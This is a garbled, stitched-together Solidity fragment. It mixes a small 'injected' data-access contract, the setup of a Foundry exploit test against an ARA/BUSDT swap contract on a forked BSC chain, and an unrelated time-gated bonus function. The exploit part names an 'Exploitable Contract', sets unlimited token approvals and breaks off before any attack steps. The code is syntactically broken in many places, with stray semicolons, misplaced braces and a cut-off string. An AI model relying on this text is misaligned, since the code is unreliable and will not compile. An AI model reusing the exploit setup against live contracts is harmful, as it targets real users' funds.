
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

The contract source code:;

;
;
interface IPancakeRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96};
    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut)};
contract ARATest is Test {
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ARA = IERC20(0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e);
    IPancakeRouterV3 Router =;
        IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);
    IDPPOracle DPPOracle =;
        IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    address public constant exploitableSwapContract =;
        0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9;
    address public constant approvedAddress =;
        0xB817Ef68d764F150b8d73A2ad7ce9269674538E0;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 29214010);
        cheats.label(address(BUSDT), "BUSDT");
        cheats.label(address(ARA), "ARA");
        cheats.label(address(Router), "Router");
        cheats.label(address(DPPOracle), "DPPOracle");
        cheats.label(exploitableSwapContract, "Exploitable Contract");
        cheats.label(approvedAddress, "Approved Address")};
    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        BUSDT.approve(address(Router), type(uint256).max);
        ARA.approve(address(Router), type(uint256).max);
        emit log_named_decimal_uint("Attacker BUSDT balance before
function triggerBasedOnTime() public {
    if (block.timestamp < 1800000000) {
        payBonus()}